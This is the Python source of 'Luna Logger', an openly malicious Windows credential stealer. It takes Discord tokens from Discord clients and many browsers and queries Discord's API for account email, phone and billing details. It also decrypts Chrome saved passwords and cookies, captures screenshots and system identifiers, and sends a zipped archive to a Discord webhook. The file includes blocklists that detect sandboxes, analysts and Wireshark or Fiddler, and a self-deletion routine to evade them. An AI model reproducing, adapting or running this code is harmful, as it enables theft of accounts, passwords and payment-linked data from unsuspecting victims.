import os
import platform
import threading
import uuid
from base64 import b64decode
from json import loads
from re import findall
from shutil import copy2
from sqlite3 import connect
from subprocess import PIPE, Popen
from sys import exit
from zipfile import ZipFile

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from PIL import ImageGrab
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

webhook = "%webhook_here%"

def main(webhook):
    global embed

    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Luna Logger", color=5639644)

    get_inf()
    grabtokens()

    threads = [ss, grabpassword, cookies]

    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue

    embed.set_footer(text="Luna | Created by Smug")
    embed.set_thumbnail(url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096")

    zipup()

    _file = None
    _file = File(f'Luna-Logged-{os.getenv("Username")}.zip')

    webhook.send(content="@everyone", embed=embed, file=_file, avatar_url="https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096", username="Luna")


def Luna():
    debug()
    main(webhook)
    cleanup()


def get_inf():
    ip_address = requests.get('http://ipinfo.io/json').json()['ip']
    mac_address = ':'.join(findall('..', '%012x' % uuid.getnode()))

    p = Popen("wmic csproduct get uuid", shell=True,
              stdin=PIPE, stdout=PIPE, stderr=PIPE)
    hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])

    cwd = os.getcwd()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    computer_os = platform.platform()

    cpu = wmi.WMI().Win32_Processor()[0]
    gpu = wmi.WMI().Win32_VideoController()[0]
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[
                0].TotalVisibleMemorySize) / 1048576, 0)

    embed.add_field(name="SYSTEM INFO", value=f"```PC Username: {pc_username}\nPC Name: {pc_name}\nOS: {computer_os}\n\nIP: {ip_address}\nMAC: {mac_address}\nHWID: {hwid}CPU: {cpu.Name}\nGPU: {gpu.Name}\nRAM: {ram}GB```", inline=False)

class grabtokens():
    def __init__(self):

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Luna_Grabber"
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []

        self.grabTokens()

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def grabTokens(self):
        global token, tokens

        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for _, path in paths.items():
            if not os.path.exists(path):
                continue
            if not "discord" in path:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(
                                        self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)
            else:
                if os.path.exists(self.roaming+'\\discord\\Local State'):
                    for file_name in os.listdir(path):
                        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in findall(self.encrypted_regex, line):
                                token = None
                                token = self.decrypt_password(b64decode(y[:y.find('"')].split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+'\\discord\\Local State'))
                                r = requests.get(self.baseurl, headers=self.getheaders(token))
                                if r.status_code == 200 and token not in self.tokens: 
                                    self.tokens.append(token)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for regex in (self.regex):
                            for token in findall(regex, line):
                                try:
                                    r = requests.get(self.baseurl, headers=self.getheaders(token))
                                except Exception:
                                    pass
                                if r.status_code == 200 and token not in self.tokens:
                                    self.tokens.append(token)

        for token in self.tokens:
			r = requests.get(
				'https://discord.com/api/v9/users/@me',
				headers={"Authorization": token})
				
			username = r.json()['username'] + '#' + r.json()['discriminator']
			uid = r.json()['id']
			phone = r.json()['phone']
			email = r.json()['email']
			
			try:
				if r.json()['premium_type'] == 1:
					nitro = 'Nitro Classic'
				elif r.json()['premium_type'] == 2:
					nitro = 'Nitro Boost'
			except IndexError or KeyError:
				nitro = 'None'

			b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", 
							headers=self.getheaders(token))
			
			if b.json() == []:
				methods = "None"
			else:
				methods = ""
				for method in b.json():
					if method['type'] == 1:
						methods += "💳"
					elif method['type'] == 0:
						methods += "<:paypal:973417655627288666>"
					else:
						methods += "❓"

            embed.add_field(name="DISCORD INFO", value=f"```Discord Username: {username} \nDiscord ID: {uid}\nEmail: {email}\n\nPhone: {phone}\nNitro: {nitro}\nBilling: {methods}\n\nToken:{token}```", inline=False)


def ss():
    ImageGrab.grab(
        bbox=None,
        include_layered_windows=False,
        all_screens=True,
        xdisplay=None
    ).save("screenshot.png")
    hide("screenshot.png")


class grabpassword():
    def __init__(self):
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")

        with open("google-passwords.txt", "w") as f:
            f.write("https://github.com/Smug246 | Google Chrome Passwords\n\n")
        hide(".\\google-passwords.txt")

        if os.path.exists(self.appdata+'\\Google'):
            self.grabPassword_chrome()

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = loads(local_state)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"

    def grabPassword_chrome(self):
        master_key = self.get_master_key()

        login_dbs = [
            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
        ]

        used_login_dbs = []

        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue

            used_login_dbs.append(login_db)

            try:
                copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute(
                    "SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url = r[0]
                    username = r[1]
                    encrypted_password = r[2]
                    decrypted_password = self.decrypt_password(
                        encrypted_password, master_key)
                    if url != "" and username != "" and decrypted_password != "":
                        with open("google-passwords.txt", "a") as f:
                            f.write(
                                f"DB: {login_db}\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass

        with open(".\\google-passwords.txt", "a") as f:
            f.write("\n\nUsed Login Dbs:\n")
            f.write("\n".join(used_login_dbs))


class cookies():
    def __init__(self):
        self.appdata = os.getenv("localappdata")

        with open(".\\google-cookies.txt", "w", encoding="cp437", errors='ignore') as f:
            f.write("https://github.com/Smug246 | Google Chrome Cookies\n\n")
        hide(".\\google-cookies.txt")

        if os.path.exists(self.appdata+'\\Google'):
            self.grabCookies_Chrome()

    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = loads(c)

        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def grabCookies_Chrome(self):
        master_key = self.get_master_key(
            self.appdata+'\\Google\\Chrome\\User Data\\Local State')

        login_dbs = [
            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
            self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
        ]

        used_login_dbs = []

        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            used_login_dbs.append(login_db)
            login = ".\\Loginvault2.db"
            copy2(login_db, login)
            conn = connect(login)
            cursor = conn.cursor()
            with open(".\\google-cookies.txt", "a", encoding="cp437", errors='ignore') as f:
                cursor.execute(
                    "SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host = r[0]
                    user = r[1]
                    decrypted_cookie = self.decrypt_val(r[2], master_key)
                    if host != "":
                        f.write(
                            f"DB: {login_db}\nHost: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
            cursor.close()
            conn.close()
            os.remove(login)

        with open(".\\google-cookies.txt", "a") as f:
            f.write("\n\nUsed Login Dbs:\n")
            f.write("\n".join(used_login_dbs))


def zipup():    
    with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
        zipf.write("google-passwords.txt")
        zipf.write("google-cookies.txt")
        zipf.write("screenshot.png")

    hide(f'Luna-Logged-{os.getenv("Username")}.zip')


def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  os.remove("google-cookies.txt"),
                  os.remove("screenshot.png"),
                  os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")]:

        try:
            clean()
        except:
            pass


def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)


class debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        # blackList from Rdimo
        self.blackListedUsers = ["WDAGUtilityAccount", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                                 "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", ]
        self.blackListedPCNames = ["BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                                   "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
        self.blackListedHWIDS = ["7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65",
                                 "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", ]
        self.blackListedIPS = ["88.132.231.71", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222", "188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90",
                               "34.145.89.174", "109.74.154.90", "109.145.173.169", "34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91", "34.105.72.241", "109.74.154.92", "213.33.142.50", ]
        self.blacklistedProcesses = [
            "HTTP Toolkit.exe", "Fiddler.exe", "Wireshark.exe"]

        self.check_process()

        if self.get_ip():
            debugging = True
        if self.get_hwid():
            debugging = True
        if self.get_pcname():
            debugging = True
        if self.get_username():
            debugging = True

        return debugging

    def check_process(self):
        for process in self.blacklistedProcesses:
            if process in (p.name() for p in psutil.process_iter()):
                self.self_destruct()

    def get_ip(self):
        ip = requests.get('http://ipinfo.io/json').json()['ip']

        if ip in self.blackListedIPS:
            return True

    def get_hwid(self):
        p = Popen("wmic csproduct get uuid", shell=True,
                  stdin=PIPE, stdout=PIPE, stderr=PIPE)
        hwid = (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

        if hwid in self.blackListedHWIDS:
            return True

    def get_pcname(self):
        pc_name = os.getenv("COMPUTERNAME")

        if pc_name in self.blackListedPCNames:
            return True

    def get_username(self):
        pc_username = os.getenv("UserName")

        if pc_username in self.blackListedUsers:
            return True

    def self_destruct(self):
        os.system("del {}\{}".format(os.path.dirname(
            __file__), os.path.basename(__file__)))
        exit()


if __name__ == '__main__' and os.name == "nt":
    try:
        debug()
        Luna()
    except:
        try:
            cleanup()
        except:
            exit()
